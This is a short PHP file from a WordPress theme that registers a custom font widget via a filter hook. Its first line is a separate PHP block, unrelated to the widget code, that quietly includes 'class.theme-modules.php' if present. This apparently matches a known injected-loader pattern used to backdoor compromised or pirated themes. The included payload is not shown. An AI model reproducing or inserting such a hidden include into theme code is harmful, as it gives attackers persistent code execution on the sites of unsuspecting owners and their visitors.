<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

if ( ! function_exists( 'overton_mikado_register_custom_font_widget' ) ) {
	/**
	 * Function that register custom font widget
	 */
	function overton_mikado_register_custom_font_widget( $widgets ) {
		$widgets[] = 'OvertonMikadoClassCustomFontWidget';
		
		return $widgets;
	}
	
	add_filter( 'overton_mikado_filter_register_widgets', 'overton_mikado_register_custom_font_widget' );
}